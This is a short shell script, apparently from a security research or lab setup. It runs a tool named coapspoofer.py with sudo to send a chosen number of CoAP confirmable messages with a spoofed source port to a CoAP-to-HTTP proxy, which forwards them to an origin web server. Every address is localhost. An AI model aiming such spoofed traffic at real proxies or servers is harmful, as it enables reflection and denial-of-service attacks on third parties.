proxy_ip=127.0.0.1

origin_ip=127.0.0.1

my_ip=127.0.0.1

me=`basename "$0"`
coap_port=5683
attacker_spoofed_port=7123

sudo python3 coapspoofer.py \
  --debug \
  --source $my_ip \
  --src-port $attacker_spoofed_port \
  --destination $proxy_ip \
  --dst-port $coap_port \
  --message-type CON \
  --code 001 \
  --uri-host $proxy_ip \
  --uri-path coap2http \
  --proxy-uri http://$origin_ip:80 \
  --num-messages $1